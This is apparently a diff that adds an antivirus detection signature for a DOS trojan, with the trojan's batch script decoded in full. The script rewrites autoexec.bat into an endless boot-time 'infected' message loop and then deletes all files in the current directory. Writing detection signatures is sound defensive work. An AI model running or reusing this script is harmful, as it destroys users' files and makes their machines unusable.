@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36579
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off cls @echo q >> c:\autoexec.bat @echo @echo off >> c:\autoexec.bat @echo :0 >> c:\autoexec.bat @echo cls >> autoexec.bat @echo echo your computer infected by my virus boot! excuse me for this! >> c:\autoexec.bat @echo pause>nul >> c:\autoexec.bat @echo goto 0 >> c:\autoexec.bat cls echo y | del *.* cls 
